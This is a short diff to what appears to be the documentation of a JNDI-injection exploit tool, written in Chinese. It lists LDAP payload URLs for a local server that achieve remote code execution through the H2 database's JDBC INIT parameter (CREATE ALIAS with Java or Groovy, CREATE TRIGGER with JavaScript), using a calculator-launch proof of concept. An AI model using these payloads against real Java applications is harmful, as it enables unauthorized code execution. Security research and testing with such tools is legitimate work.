@@ -231,10 +231,10 @@ ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator
 
 通过 H2 JDBC URL 的 INIT 参数执行 SQL 语句
 
-三种方式 RCE: CREATE ALIAS/Groovy/JavaScript
+三种方式 RCE: CREATE ALIAS + Java/Groovy, CREATE TRIGGER + JavaScript
 
 ```bash
-ldap://127.0.0.1:1389/Factory/H2/Alias/open -a Calculator
+ldap://127.0.0.1:1389/Factory/H2/Java/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/Groovy/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/open -a Calculator
 ```
